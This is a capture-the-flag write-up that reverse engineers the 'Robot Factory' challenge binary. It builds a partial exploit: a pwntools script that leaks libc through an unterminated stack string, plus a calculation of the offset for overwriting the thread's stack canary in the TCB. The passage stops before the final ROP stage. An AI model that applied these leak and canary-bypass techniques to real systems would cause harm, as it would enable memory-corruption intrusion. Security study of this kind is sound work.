# Robot Factory


<!-- vim-markdown-toc GFM -->

	* [First contact with the challenge](#first-contact-with-the-challenge)
	* [Dealing with the libc version](#dealing-with-the-libc-version)
	* [Let's start working](#lets-start-working)
	* [Reverse engineering](#reverse-engineering)
		* [Main function](#main-function)
	* [Robot structure and enumerations](#robot-structure-and-enumerations)
	* [create_robot](#create_robot)
		* [Initialisation](#initialisation)
		* [ROBOT_TYPE_STRING](#robot_type_string)
		* [ROBOT_TYPE_NUMBER](#robot_type_number)
		* [end of create_robot](#end-of-create_robot)
	* [do_robot](#do_robot)
	* [do_num & do_string](#do_num--do_string)
	* [sub_func](#sub_func)
	* [add_func (leaking glibc)](#add_func-leaking-glibc)
* [Snippet from glibc 2.31 source sysdeps/x86_64/nptl/tls.h](#snippet-from-glibc-231-source-sysdepsx86_64nptltlsh)
* [context.log_level = "DEBUG"](#contextlog_level--debug)
* [r = elf.process()](#r--elfprocess)
* [Sending 104 bytes to leak the libc](#sending-104-bytes-to-leak-the-libc)
* [tcbhead_t.stack_guard overwrite](#tcbhead_tstack_guard-overwrite)
* [execve("/bin/sh", NULL, NULL)](#execvebinsh-null-null)

<!-- vim-markdown-toc -->

## First contact with the challenge

First of all, we can take some informations on the challenge.
```bash
$ file robot_factory
robot_factory: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d6e694daa79af6145f3de9379bbf92e64241e4c1, for GNU/Linux 4.4.0, not stripped

$ checksec ./robot_factory
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
So we've got an x86_64 ELF, non stripped. For the protections, we have no PIE and a NX which tipically indicates that we will have to ROP (or ret2libc if we can leak the libc, we can assume that ASLR is activated on remote). However, we'll have to face a problem : the stack canary.

## Dealing with the libc version

We can see that the binary is given with a certain libc to use, so first of all we have to make the binary use this libc.
```bash
$ ls
libc.so.6  robot_factory

$ ldd ./robot_factory 
	linux-vdso.so.1 (0x00007ffecf1e4000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb9a4afa000)
	libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007fb9a48db000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fb9a4eeb000)
```

As we can see, the binary will take my glibc wich is in `/lib/x86_64-linux-gnu/libc.so.6` and not the local libc. Let's first see which version of the glibc we've got here.

```bash
$ ./libc.so.6 
GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.2) stable release version 2.31.
Copyright (C) 2020 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 9.3.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
For bug reporting instructions, please see:
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
``` 

It's a glibc version `2.31-0ubuntu9.2`. Let's now use patchelf on a copy of the binary to tell the binary to use our local libc by setting the rpath to ".".

```bash
$ cp robot_factory robot_factory_patched

$ patchelf --set-rpath . ./robot_factory_patched

$ ./robot_factory_patched
./robot_factory_patched: relocation error: /lib/x86_64-linux-gnu/libpthread.so.0: symbol __libc_vfork version GLIBC_PRIVATE not defined in file libc.so.6 with link time reference
```

Well, that's was not going great so I pulled an ubuntu:20.04 docker wich has a native glibc in version 2.31, patched the binary the same way with patchelf to use the given glibc and everything was working fine !

## Let's start working

Let's execute the binary to have a first idea of the challenge : 

```bash
$ ./robot_factory # hello from my ubuntu:20.04 docker
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
|                                 |
|  WELCOME TO THE ROBOT FACTORY!  |
|    DAYS WITHOUT AN ACCIDENT:    |
|               0                 |
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
What kind of robot would you like? (n/s) > s
What kind of operation do you want? (a/s/m) > a
Enter string 1: HELLO
Enter string 2: IT'S ME
What kind of robot would you like? (n/s) > Result: HELLOIT'@
n
What kind of operation do you want? (a/s/m) > m
Enter number 1: 12
Enter number 2: 34
What kind of robot would you like? (n/s) > Result: 140125130600136
```

We can notice two interesting phenomens : 
- By selecting a type "s" robot with a "a" operation, the result printed is not exactly the concatenation of our two strings 
    - --> We are leaking some bytes here
- The menu is re-printed before the apparition of the "Result"
    - --> This may indicate the usage of multi-threading

Let's open this binary in IDA to inspect it more precisely.

## Reverse engineering

### Main function

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp) {

  pthread_t newthread; // [rsp+8h] [rbp-8h] BYREF

  setvbuf(stdout, 0LL, 2, 0LL);
  puts("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=");
  puts("|                                 |");
  puts("|  WELCOME TO THE ROBOT FACTORY!  |");
  puts("|    DAYS WITHOUT AN ACCIDENT:    |");
  puts("|               0                 |");
  puts("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=");
  
  pthread_create(&newthread, 0LL, self_destruct_protocol, 0LL);
  
  while ( 1 )
    create_robot();
}
```

Our main function will initialize stdout and print a banner. Then, it will create a thread that will execute the `self_destruct_protocol` function.

```c	
void __fastcall __noreturn self_destruct_protocol(void *a1) {

  int v1; // eax
  int i; // [rsp+Ch] [rbp-4h]

  while(1) {
    for(i=0; i <= 7; ++i)  {
      if(robots[i] && *(robots[i] + 56)) {
        v1 = *(robots[i] + 8);
        
        if(v1){
          if(v1 == 1)
            printf("Result: %s", *(robots[i] + 32));
        
        }else{
          printf("Result: %ld", *(robots[i] + 32));
        }
        write(1, "\n", 2uLL);
        free(robots[i]);
        robots[i] = 0LL;
      }
    }
    sleep(1u);
  }
}
```
 This function will free the 8 possible robots in the `robots` list if `*(robots[i] + 56) == 0`. By the way, this function informs us that a robot is a quite complex structure that we will have to identify to ease the analysis of the program.
 
## Robot structure and enumerations

As we said, a robot is a quite complex structure. Because this is not a reversing challenge, let's take a shortcut in this writeup and directly see how I structured a robot in IDA (this data structures were written after taking a look at all the functions).

```c
robot struc ; (sizeof=0x39, mappedto_8)
0x00 thread dq ?
0x08 robot_type dd ?          ; enum ROBOT_TYPE
0x0C operation_type dd ?      ; enum ROBOT_OPERATION
0x10 element1 dq ?            ; can be string1 or number1
0x18 element2 dq ?            ; can be str2, number2 or size
0x20 operation_result dq ?
0x28 str1_length dq ?
0x30 str2_length dq ?
0x38 ready_2befree db ?       ; set to 1 at the end of the robot's usage
```

To this structure, we can add the two enumerations `ROBOT_TYPE` and `ROBOT_OPERATION` :

```c
; enum ROBOT_TYPE, mappedto_13
ROBOT_TYPE_NUMBER  = 0  
ROBOT_TYPE_STRING  = 1  

; enum ROBOT_OPERATION, mappedto_14
ROBOT_OPERATION_ADD  = 0
ROBOT_OPERATION_SUB  = 1
ROBOT_OPERATION_MULTIPLY  = 2 
```

## create_robot

### Initialisation

The main function of this program is the create_robot function. It starts by checking if the list of 8 maximum simultaneous robots is not full, if if it not the case it will allocate a new robot structure in the heap with a `malloc(0x40)`.

```c
robot_index = -1;
  for ( i = 0; i <= 7; ++i ) {
    if ( !robots[i] ) {
      robot_index = i;
      break;
    }
  }

  if ( robot_index == -1 ) {
    puts("Error! No free parts!");
    return;
  }

  robots[robot_index] = (robot *) malloc(0x40uLL);
  robots[robot_index]->ready_2befree = 0;
```

Then, the user inputs are asked : the robot type and the operation type (as we saw during our execution of the binary).

```c
  do {
    printf("What kind of robot would you like? (n/s) > ");
    ROBOT_TYPE = getchar();
    getchar();
  
  } while ( ROBOT_TYPE != 'n' && ROBOT_TYPE != 's' );

  do {
    printf("What kind of operation do you want? (a/s/m) > ");
    ROBOT_OPERATION = getchar();
    getchar();
  } while ( ROBOT_OPERATION != 'a' && ROBOT_OPERATION != 's' && ROBOT_OPERATION != 'm' );
```

### ROBOT_TYPE_STRING

If we choose the "s" type (`ROBOT_TYPE_STRING`), this code is executed:

```c
  if ( ROBOT_TYPE == 's' ) {
    robots[robot_index]->robot_type = ROBOT_TYPE_STRING;
    printf("Enter string 1: ");

    ptr1_robot = robots[robot_index];
    ptr1_robot->element1 = malloc(0x100uLL);

    fgets(robots[robot_index]->element1, 256, stdin);
    str_length = memchr(robots[robot_index]->element1, '\n', 0x100uLL) - robots[robot_index]->element1;

    robots[robot_index]->str1_length = str_length;

    if ( ROBOT_OPERATION == 'a' ) {
      printf("Enter string 2: ");

      ptr2_robot = robots[robot_index];
      ptr2_robot->element2 = malloc(0x100uLL);

      fgets(robots[robot_index]->element2, 256, stdin);
      str_length = memchr(robots[robot_index]->element2, '\n', 0x100uLL) - robots[robot_index]->element2;

      robots[robot_index]->str2_length = str_length;
    
    } else {
      if ( ROBOT_OPERATION != 'm' ) // if 's' --> ROBOT_OPERATION_SUSBSTRACT
      {
        puts("NOT IMPLEMENTED");
        free(robots[robot_index]);
        return;
      }

      printf("Enter size: ");
      __isoc99_scanf("%ld", &robots[robot_index]->element2);
      getchar();
    }
  }
```
First of all, it will set `robot->robot_type` to `ROBOT_TYPE_STRING`.

No matter the operation choosen, a first string will be asked to the user. This first string will be stored in a buffer allocated with `malloc(0x100)`, that will return a pointer which will be stored in `robot->element1`, and the size of the input will be stored in `input->str1_length`.

- If the selected operation is 'a' (`ROBOT_OPERATION_ADD`), a second string input is asked from the user and stored the same way : a pointer to the string is stored in `robot->element1` and the size of the input is stored in `input->str2_length`.

- If the selected operation is 's' (`ROBOT_OPERATION_SUBSTRACT`), a message saying "not implemented" is printed and the function returns.

- Else, if the selected operation is 'm' (`ROBOT_OPERATION_MUTIPLY`), the program will ask for a size input (long) and will store it in `robot->element2`.

### ROBOT_TYPE_NUMBER

If the selected robot type is 'n' (`ROBOT_TYPE_NUMBER`), the folllowing code will be executed: 

```c
  else {
    robots[robot_index]->robot_type = ROBOT_TYPE_NUMBER;

    printf("Enter number 1: ");
    __isoc99_scanf("%ld", &robots[robot_index]->element1);
    getchar();

    printf("Enter number 2: ");
    __isoc99_scanf("%ld", &robots[robot_index]->element2);
    getchar();
  }
```

The `robot->robot-type` is set to `ROBOT_TYPE_NUMBER` and two number are asked to the user and stored in `robot->element1` and `robot->element2`.

### end of create_robot

At the end of the function, the following code is executed: 

```c
  switch ( ROBOT_OPERATION )
  {
    case 's':
      robots[robot_index]->operation_type = ROBOT_OPERATION_SUB;
      break;
    case 'a':
      robots[robot_index]->operation_type = ROBOT_OPERATION_ADD;
      break;
    case 'm':
      robots[robot_index]->operation_type = ROBOT_OPERATION_MULTIPLY;
      break;
  }

  pthread_create(&newthread, 0LL, do_robot, robots[robot_index]);
  robots[robot_index]->thread = newthread;
```

This will set `robot->operation_type` to the selected `ROBOT_OPERATION` and then create a new thread that will execute `do_robot(robot)`.

## do_robot

```c
unsigned __int64 __fastcall do_robot(robot *robot) {

  unsigned __int64 robot_type; // rax

  robot_type = robot->robot_type;

  if ( !robot_type )     // if ROBOT_TYPE_NUMBER
    return do_num(robot);

  if ( robot_type == ROBOT_TYPE_STRING )
    return do_string(robot);

  return robot_type;
}
```

This function will call `do_string(robot)` if we have a `ROBOT_TYPE_STRING` or `do_num(robot)` if we have a `ROBOT_TYPE_NUMBER`.

## do_num & do_string

The code of those two functions if pretty much the same. Basically, they will call the operation corresponding function with the robot as a parameter : `add_func(robot)`, `sub_func(robot)` and `mutiply_func(robot)`. After that, they will set `robot->ready_2befree` to TRUE (1), check that no overflow occured by checking the stack_canary value (only for `do_string`) and return.

```c
robot *__fastcall do_num(robot *robot) {

  ROBOT_OPERATION operation_type; // eax
  robot *result; // rax
  char v3; // [rsp+18h] [rbp-8h] BYREF

  robot->operation_result = &v3;
  operation_type = robot->operation_type;

  if ( operation_type == ROBOT_OPERATION_MULTIPLY ) {
    multiply_func(robot);
  }

  else if ( operation_type <= ROBOT_OPERATION_MULTIPLY ) {
    if ( operation_type )
      sub_func(robot);
    else
      add_func(robot);
  }
  result = robot;
  robot->ready_2befree = 1;

  return result;
}
```
We can notice that the `do_string` function will never call `sub_func` as we saw in the `do_robot` source code, this function is not implemented for a `ROBOT_TYPE_STRING` robot.

## sub_func

```c
__int64 __fastcall sub_func(robot *robot) {

  __int64 tmp; // rax

  tmp = robot->robot_type;
  if ( tmp ) {
    if ( tmp == ROBOT_TYPE_STRING )
      BUG();
  
  } else {
    tmp = robot->operation_result;
    *tmp = robot->element1 - robot->element2;
  }
  return tmp;
}
```

The sub function will first check if the `ROBOT_TYPE` is not `ROBOT_TYPE_STRING`, otherwise the process will crash himself.

Then, to resume, `robot->operation_result` will contain the adress of our "tmp" variable that will contain the substraction result. Because of this "programmation mistake" (don't forget that this is a challenge), when the `self_destruct_protocol` will be called to print the operation result and free our robot structure, the `robot->operation_result` will be an address in the stack : this function will then leak the address of "tmp" by printing it as a long !

We can try to check during a debug session in IDA :
```bash
$ ./robot_factory
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
|                                 |
|  WELCOME TO THE ROBOT FACTORY!  |
|    DAYS WITHOUT AN ACCIDENT:    |
|               0                 |
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
What kind of robot would you like? (n/s) > n
What kind of operation do you want? (a/s/m) > s
Enter number 1: 42
Enter number 2: 41
Result: 139990440083144
```
```py
$ python -q
>>> hex(139990440083144)
'0x7f521073fec8'
```
```
debug008:00007F521073FEC8 operation_result_0 dq 1
```
After that the robot was officialy deleted, there is some garbage in there but our stack pointer is always here at the `robot->operation-result`'s position !
```
[heap]:000000000092F380 robot_0 dq 0 
[heap]:000000000092F388 dd 80008D0h
[heap]:000000000092F38C dd 7F52h
[heap]:000000000092F390 dq 42
[heap]:000000000092F398 dq 41
[heap]:000000000092F3A0 dq offset operation_result_0
[heap]:000000000092F3A8 dq 0
[heap]:000000000092F3B0 dq 0
[heap]:000000000092F3B8 db 1
```

Our theory is confirmed ! We can use this function to leak a fixed stack address, that's cool... But quite useless for us. We want to leak some glibc address to perform a ret2libc.

## add_func (leaking glibc)

```c
void __fastcall add_func(robot *robot) {
  ROBOT_TYPE robot_type; // eax

  robot_type = robot->robot_type;

  if ( robot_type ) {
    if ( robot_type == ROBOT_TYPE_STRING ) {
      memcpy(robot->operation_result, robot->element1, robot->str1_length);
      memcpy((robot->str1_length + robot->operation_result), robot->element2, robot->str2_length);

      free(robot->element1);
      free(robot->element2);
    }
  
  } else {
    *robot->operation_result = robot->element1 + robot->element2;
  }
}
```

For an `OPERATION_TYPE_NUMBER`, the behavior of the function is quite the same as `add_func` with the same leak, but of course the operation is an addition instead of a substraction...

However, it's quite interesting for the `OPERATION_TYPE_STRING` part. The program will concatenate the two strings `robot->element1` and `robot->element2` on the stack : at `robot->operation_result`. Moreover, the programm will not put a nullbyte (\x00) at the end of the string ! This is what we saw at the first execution, this will allow us to leak the stack content because everything after this string will be printed until a nullbyte.

So we now have to leak something interesting that will allow us to calulate the libc base address and to perform a ret2libc later. Let's use IDA in a debuggind session to find an interesting pointer to leak in the stack.

To do this, we will put a breakpoint in `self_destruct_protocol` where our `robot->operation_result` is printed, if this is a `ROBOT_TYPE_STRING` : the address 0x401279 for example.

```x86asm
loc_401279:
0x401279:   mov     eax, [rbp+var_4]
0x40127C:   cdqe
0x40127E:   mov     rax, ds:robots[rax*8]
0x401286:   mov     rax, [rax+20h]
0x40128A:   mov     rsi, rax
0x40128D:   mov     edi, offset aResultS ; "Result: %s"
0x401292:   mov     eax, 0
0x401297:   call    _printf
```

Then we will examinate the robot (address in rax at address 0x401286) to get the stack_pointer `robot->operation_result` where our string concatenation is stored.

```x86asm
(gdb) x/10x *(0x4040c0) # robots[0]
0x1876940:	0x00007f8f4e672700	0x0000000000000001
0x1876950:	0x0000000001876990	0x0000000001876aa0
0x1876960:	0x00007f8f4e671dc0	0x0000000000000008
0x1876970:	0x0000000000000008	0x0000000000000001
0x1876980:	0x0000000000000000	0x0000000000000221
```
Our `robot->operation_result` in then 0x07f8f4e671dc0. Let's examine the stack at this address.

```x86asm
(gdb) x/64x 0x00007f8f4e671dc0
0x7f8f4e671dc0:	0x4141414141414141	0x4242424242424242
0x7f8f4e671dd0:	0x0000000000000000	0x0000000000000000
0x7f8f4e671de0:	0x0000000000000000	0x0000000000000000
0x7f8f4e671df0:	0x0000000000000000	0x0000000000000000
0x7f8f4e671e00:	0x0000000000000000	0x0000000000000000
0x7f8f4e671e10:	0x0000000000000000	0x0000000000000000
0x7f8f4e671e20:	0x0000000000000000	0x00007f8f4f73900b
0x7f8f4e671e30:	0x0000000000000000	0x0000000000000000
0x7f8f4e671e40:	0x0000000000000000	0x0000000000000000
0x7f8f4e671e50:	0x0000000000020000	0x0000000000001000
0x7f8f4e671e60:	0x0000000000000000	0x924764998c943b00
0x7f8f4e671e70:	0x0000000000000000	0x00007f8f40000b50
0x7f8f4e671e80:	0x00007f8f400008d0	0xffffffffffffffb0
0x7f8f4e671e90:	0x0000000000000000	0x00007f8f4f88ab80
0x7f8f4e671ea0:	0x00007f8f40000b50	0x00007f8f4f73ca26
0x7f8f4e671eb0:	0x00007fffe890132e	0x0000000000000000
0x7f8f4e671ec0:	0x00007fffe8901330	0x0000000000000000
0x7f8f4e671ed0:	0x0000000000000000	0x00007fffe890132e
0x7f8f4e671ee0:	0x00007fffe890132f	0x00007fffe8901330
0x7f8f4e671ef0:	0x00007f8f4e671fc0	0x00007f8f4f6818aa
0x7f8f4e671f00:	0x0000000000000000	0x00007f8f4e672700
0x7f8f4e671f10:	0x00007f8f4e672700	0xca7010189acbe460
0x7f8f4e671f20:	0x00007fffe890132e	0x00007fffe890132f
0x7f8f4e671f30:	0x00007fffe8901330	0x00007f8f4e671fc0
0x7f8f4e671f40:	0x356e8cd6a4cbe460	0x356e8ec8b1a9e460
0x7f8f4e671f50:	0x0000000000000000	0x0000000000000000
0x7f8f4e671f60:	0x0000000000000000	0x0000000000000000
0x7f8f4e671f70:	0x0000000000000000	0x0000000000000000
0x7f8f4e671f80:	0x0000000000000000	0x0000000000000000
0x7f8f4e671f90:	0x0000000000000000	0x924764998c943b00
0x7f8f4e671fa0:	0x00007f8f4e672700	0x0000000000000000
0x7f8f4e671fb0:	0x00007fffe890132e	0x00007f8f4f7c1293
```
Let's see where the glibc is mapped in memory.
```x86asm
(gdb) info proc map 
process 3046
Mapped address spaces:

Start Addr           End Addr       Size     Offset objfile
  0x3ff000           0x400000     0x1000        0x0 /root/htb_pwn_robot_factory/robot_factory
  0x400000           0x401000     0x1000     0x1000 /root/htb_pwn_robot_factory/robot_factory
  0x401000           0x402000     0x1000     0x2000 /root/htb_pwn_robot_factory/robot_factory
  0x402000           0x403000     0x1000     0x3000 /root/htb_pwn_robot_factory/robot_factory
  0x403000           0x404000     0x1000     0x3000 /root/htb_pwn_robot_factory/robot_factory
  0x404000           0x405000     0x1000     0x4000 /root/htb_pwn_robot_factory/robot_factory
 0x1876000          0x1897000    0x21000        0x0 [heap]
 [...]
0x7f8f4f69f000     0x7f8f4f6c4000    0x25000        0x0 /root/htb_pwn_robot_factory/libc.so.6
0x7f8f4f6c4000     0x7f8f4f83c000   0x178000    0x25000 /root/htb_pwn_robot_factory/libc.so.6
0x7f8f4f83c000     0x7f8f4f886000    0x4a000   0x19d000 /root/htb_pwn_robot_factory/libc.so.6
0x7f8f4f886000     0x7f8f4f887000     0x1000   0x1e7000 /root/htb_pwn_robot_factory/libc.so.6
0x7f8f4f887000     0x7f8f4f88a000     0x3000   0x1e7000 /root/htb_pwn_robot_factory/libc.so.6
0x7f8f4f88a000     0x7f8f4f88d000     0x3000   0x1ea000 /root/htb_pwn_robot_factory/libc.so.6
[...]
```

Our libc is mapped between `0x00007f8f4f69f000` and `0x00007f8f4f88d000`. The first address to be in this range on our stack is `0x00007f8f4f73900b` (at the stack address `0x7f8f4e671e28`, 104 bytes after the address of our strings concatenation). Let's calulate the offset to the base_address :

```python
$ ./python -q
>>> hex(0x00007f8f4f73900b - 0x00007f8f4f69f000)
'0x9a00b'
```

We now know how to leak the libc's base address ! Let's start a script:

```py
from pwn import *

elf = ELF('./robot_factory')
libc = ELF('./libc.so.6')

# context.log_level = "DEBUG"

# r = remote('167.172.49.117', 30563)
r = elf.process()

############################ LIBC LEAK ############################
r.sendlineafter(b' (n/s) > ', b's')
r.sendlineafter(b' (a/s/m) > ', b'a')

# Sending 104 bytes to leak the libc
r.sendlineafter(b'1: ', b'A' * 96)
r.sendlineafter(b'2: ', b'B' * 8)

leak = r.recvuntil(b'\n\0', drop=True).split(b' ')[-1]
leak = leak.replace(b'A', b'').replace(b'B', b'')
log.success(f"leak : {leak}")

libc_base = leak.ljust(8, b'\x00')
libc_base = u64(libc_base) - 0x9a00b
log.success(f'glibc base address : {hex(libc_base)}')

r.close()
```
The execution gives us this result:

 ```bash
$ python3 solve.py
[*] '/root/htb_pwn_robot_factory/robot_factory'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  b'.'
[*] '/root/htb_pwn_robot_factory/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/root/htb_pwn_robot_factory/robot_factory': pid 3789
[+] leak : b'\x0b\xd0k?\xc5\x7f'
[+] glibc base address : 0x7fc53f623000
[*] Stopped process '/root/htb_pwn_robot_factory/robot_factory' (pid 3789)
```

## multiply_func (tcbhead_t overflow and ret2libc)

```c
__int64 __fastcall multiply_func(robot *robot) {
  __int64 tmp; // rax
  __int64 i; // [rsp+10h] [rbp-10h]
  __int64 str1_length; // [rsp+18h] [rbp-8h]

  tmp = robot->robot_type;
  if ( tmp ) {
    if ( tmp == ROBOT_TYPE_STRING ) {
      memcpy(robot->operation_result, robot->element1, robot->str1_length);
      str1_length = robot->str1_length;

      for ( i = 0LL; ; ++i ) {
        tmp = robot->element2;

        if ( i >= tmp )
          break;

        memcpy((str1_length + robot->operation_result), robot->element1, robot->str1_length);
        str1_length += robot->str1_length;
      }
    }
  } else {
    tmp = robot->operation_result;
    *tmp = robot->element1 * robot->element2;
  }
  return tmp;
}
```

If the `robot->robot_type` is `ROBOT_TYPE_NUMBER`, this function will have the same behavior as `sub_func` or `add_func` but of course with a multiplication.

Else, if the `robot->robot_type` is `ROBOT_TYPE_NUMBER`, the program will multiply our string in `robot->element1` by `robot->element2` (long), always on the stack as we saw before.

We are then not limited to an input of max 512 char, with this function we can write on the stack a total of 256*(2^64 - 1)... When can then try some inputs :
```bash
$ ./robot_factory
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
|                                 |
|  WELCOME TO THE ROBOT FACTORY!  |
|    DAYS WITHOUT AN ACCIDENT:    |
|               0                 |
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
What kind of robot would you like? (n/s) > s
What kind of operation do you want? (a/s/m) > m
Enter string 1: AAAAAAAAAA
Enter size: 100
What kind of robot would you like? (n/s) > *** stack smashing detected ***: terminated
fish: './robot_factory' terminated by signal SIGABRT (Abort)

$ ./robot_factory
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
|                                 |
|  WELCOME TO THE ROBOT FACTORY!  |
|    DAYS WITHOUT AN ACCIDENT:    |
|               0                 |
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
What kind of robot would you like? (n/s) > s
What kind of operation do you want? (a/s/m) > m
Enter string 1: AAAAAAAAAA
Enter size: 1000
What kind of robot would you like? (n/s) > fish: './robot_factory' terminated by signal SIGSEGV (Address boundary error)
```

Something really interesting happened here : with 100*(10*'A'), the programm detects the stack smashing and exit, but with a bigger input of 1000*(10*'A') we've got a SIGSEGV, which means our stack canary save was equal to fs:0x28 ?...

First of all, let's see where a stack canary is used and checked. the `__stack_chk_fail` has only one cross-reference : it is only used in the `do_string` function, and this it this function that will call `multiply_func(robot)`. Our stack frames are structured like this:

```
[#0] 0x4019df → multiply_func()
[#1] 0x4017ee → do_string()
[#2] 0x401774 → do_robot()
[#3] 0x7f9161b5b609 → start_thread(arg=<optimized out>)
[#4] 0x7f9161c9b293 → clone()
```

Let's debug this to see were is located our stack_cookie when its value is checked in the`do_string` function.

```py
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xcdf6ed2c7f4e9d00
$rbx   : 0x0               
$rcx   : 0x41414141        
$rdx   : 0x5               
$rsp   : 0x00007f2e537c9db0  →  0x0000000000000000
$rbp   : 0x00007f2e537c9ed0  →  0x00007f2e537c9ef0  →  0x0000000000000000
$rsi   : 0x41414141        
$rdi   : 0x00007f2e537c9dcf  →  0x0000004141414141 ("AAAAA"?)
$rip   : 0x00000000004017ff  →  <do_string+121> sub rax, QWORD PTR fs:0x28
$r8    : 0x00007f2e537ca700  →  0x00007f2e537ca700  →  [loop detected]
$r9    : 0x00007f2e537ca700  →  0x00007f2e537ca700  →  [loop detected]
$r10   : 0xfffffffffffff326
$r11   : 0x00007f2e54184670  →   endbr64 
$r12   : 0x00007ffc5164606e  →  0x0000000000000000
$r13   : 0x00007ffc5164606f  →  0x0000000000000000
$r14   : 0x00007ffc51646070  →  0x0000000000000000
$r15   : 0x00007f2e537c9fc0  →  0x0000000000000000
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
───────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007f2e537c9db0│+0x0000: 0x0000000000000000	 ← $rsp
0x00007f2e537c9db8│+0x0008: 0x00000000021663c0  →  0x0000000000000000
0x00007f2e537c9dc0│+0x0010: "AAAAAAAAAAAAAAAAAAAA"
0x00007f2e537c9dc8│+0x0018: "AAAAAAAAAAAA"
0x00007f2e537c9dd0│+0x0020: 0x0000000041414141 ("AAAA"?)
0x00007f2e537c9dd8│+0x0028: 0x0000000000000000
0x00007f2e537c9de0│+0x0030: 0x0000000000000000
0x00007f2e537c9de8│+0x0038: 0x0000000000000000
─────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4017f6 <do_string+112>  mov    BYTE PTR [rax+0x38], 0x1
     0x4017fa <do_string+116>  nop    
     0x4017fb <do_string+117>  mov    rax, QWORD PTR [rbp-0x8]
 →   0x4017ff <do_string+121>  sub    rax, QWORD PTR fs:0x28
     0x401808 <do_string+130>  je     0x40180f <do_string+137>
     0x40180a <do_string+132>  call   0x401070 <__stack_chk_fail@plt>
     0x40180f <do_string+137>  leave  
     0x401810 <do_string+138>  ret    
     0x401811 <do_num+0>       push   rbp
─────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "robot_factory", stopped 0x7f2e5410717c in read (), reason: SINGLE STEP
[#1] Id 2, Name: "robot_factory", stopped 0x7f2e540d63bf in clock_nanosleep (), reason: SINGLE STEP
[#2] Id 3, Name: "robot_factory", stopped 0x4017ff in do_string (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4017ff → do_string()
[#1] 0x401774 → do_robot()
[#2] 0x7f2e53fd8609 → start_thread(arg=<optimized out>)
[#3] 0x7f2e54118293 → clone()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

(gdb) p $fs_base
$1 = 0x7f2e537ca700

(gdb) x/x 0x7f2e537ca700+0x28
0x7f2e537ca728:	0xcdf6ed2c7f4e9d00
```

Surprinsing, our $fs_base is equal to 0x7f2e537ca700 which is a stack value ?

After some researches (thx to this article : https://dystopia.sg/3kctf21-masterc), we just found the TCB (Thread Control Block). In a new thread, this structure is stored on the top of the stack !

```c
# Snippet from glibc 2.31 source sysdeps/x86_64/nptl/tls.h

typedef struct {
  void *tcb;            /* Pointer to the TCB.  Not necessarily the
                           thread descriptor used by libpthread.  */
  dtv_t *dtv;
  void *self;           /* Pointer to the thread descriptor.  */
  int multiple_threads;
  int gscope_flag;
  uintptr_t sysinfo;
  uintptr_t stack_guard;
  uintptr_t pointer_guard;
  unsigned long int vgetcpu_cache[2];
  /* Bit 0: X86_FEATURE_1_IBT.
     Bit 1: X86_FEATURE_1_SHSTK.
   */
  unsigned int feature_1;
  int __glibc_unused1;
  /* Reservation of some values for the TM ABI.  */
  void *__private_tm[4];
  /* GCC split stack support.  */
  void *__private_ss;
  /* The lowest address of shadow stack,  */
  unsigned long long int ssp_base;
  /* Must be kept even if it is no longer used by glibc since programs,
     like AddressSanitizer, depend on the size of tcbhead_t.  */
  __128bits __glibc_unused2[8][4] __attribute__ ((aligned (32)));

  void *__padding[8];
} tcbhead_t;
```

We then know that our stack_canary is stored is 0x7f2e537ca700 + 0x28 = 0x7f2e537ca728.

Let's calculate the offset between our `robot->operation-result` and `fs:0x28` :

```py
(gdb) x/gx $rbp-0x118
0x7f2e537c9db8:	0x00000000021663c0
(gdb) x/10gx 0x00000000021663c0
0x21663c0:	0x0000000000000000	0x00007f2e4c0008d0
0x21663d0:	0x0000000002166820	0x0000000000000003
0x21663e0:	0x00007f2e537c9dc0	0x0000000000000005
0x21663f0:	0x0000000000000000	0x0000000000000001
0x2166400:	0x0000000000000000	0x0000000000000411
(gdb) q

root@004b5e518bfc ~/htb_pwn_robot_factory# python3 -q
>>> operation_result = 0x00007f2e537c9dc0
>>> canary = 0x7f2e537ca728
>>> canary - operation_result
2408
```

